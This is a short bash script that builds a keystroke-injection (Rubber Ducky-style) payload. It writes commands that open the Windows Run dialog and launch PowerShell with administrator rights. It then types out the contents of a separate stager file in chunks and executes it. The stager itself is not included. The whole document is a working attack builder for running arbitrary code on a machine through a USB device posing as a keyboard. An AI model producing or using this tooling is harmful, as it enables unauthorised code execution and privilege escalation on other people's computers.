#!/bin/bash

cat <<-EOF >script.txt
DELAY 1500
GUI r
DELAY 500
STRING powershell.exe Start-Process powershell.exe -Verb RunAs
ENTER
DELAY 1500
$(cat stager.txt | fold -w99 | sed 's/^/STRING /g')
ENTER

EOF
